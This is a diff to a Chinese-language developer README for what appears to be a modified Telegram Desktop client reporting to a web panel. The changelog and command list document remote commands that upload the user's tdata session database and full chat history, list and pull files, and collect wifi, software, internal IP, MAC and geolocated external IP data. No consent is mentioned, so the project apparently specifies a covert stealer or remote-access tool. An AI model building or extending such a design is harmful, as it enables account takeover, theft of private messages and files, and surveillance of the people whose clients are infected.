@@ -2,6 +2,10 @@
 
 ### 修改日志 (2026-01-18)
 
+*   **功能新增**: 对接 Web 端文件管理需求，新增 `get_file_list` (文件列表)、`download_file` (文件下载/上传到客户端) 指令。
+*   **功能新增**: 对接 Web 端实时聊天需求，新增 `get_chat_history_json` 指令，支持分页获取聊天记录。
+*   **协议变更**: 调整 `wifi_scan_results` 表字段及 JSON 返回格式，字段名更新为 `signal` (原 `signal_strength`) 和 `auth` (原 `security_type`) 以匹配 Web 端标准。
+*   **Bug修复**: 优化 `system_info` 收集逻辑，修复内网 IP 和 MAC 地址显示为 `Unknown` 的问题（增加双重网络接口检测）。
 *   **文档更新**: 同步了 Web 端 (`platform/README.md`) 的数据库上传标准，明确了 `tdata_client_{TGID}.db` 的命名规范。
 *   **文档更新**: 添加了 Web 端开发需求说明，明确了 `get_current_user` 接口对接规范。
 *   **功能修复**: 修复了 `upload_db` 任务状态卡在 `in_progress` 的问题。
@@ -18,7 +22,16 @@
 *   **我对 Web 端的要求**: 所有针对 Web 端接口、功能配合的需求，**必须** 记录在本文件的 [Web 端开发协作注意事项](#web端开发协作注意事项) 章节中。
 *   **Web 端对我的要求**: 请查阅 `../platform/README.md` (如果存在) 或由 Web 端同事同步。
 
-### 3. 协作流程
+### 4. Web 端开发需求
+**IP 地理位置解析**:
+*   客户端现已改为直接请求 `https://ipinfo.io/json` 获取外网 IP。
+*   Web 端在接收到客户端上报的 `external_ip` 后，**必须**自行调用 IP 地理位置查询接口（如 ip-api.com 或 ipinfo.io），以获取并展示该 IP 的详细信息，包括：
+    *   **国家 (Country)**
+    *   **区域/省份 (Region)**
+    *   **城市 (City)**
+    *   **ISP 运营商 (Org)**
+
+### 5. 协作流程
 *   修改 `tdesktop` 代码前，请先拉取最新代码。
 *   提交修改后，请及时更新本 `README.md` 中的修改日志。
 
@@ -253,6 +266,9 @@ Web端已明确数据库文件的命名与结构规范，请 C++ 端严格遵守
         *   `upload_db`: 上传本地 `tdata` 数据库。
         *   `fetch_full_chat_history`: 触发全量聊天记录同步并上传。
         *   `get_wifi` / `get_software`: 触发特定信息收集。
+        *   `get_file_list`: 获取指定目录文件列表。
+        *   `download_file`: 下载远程文件到本地。
+        *   `get_chat_history_json`: 获取指定会话的聊天记录 (JSON)。
 
 ### 最近更新 (阶段 6 & 7)
 
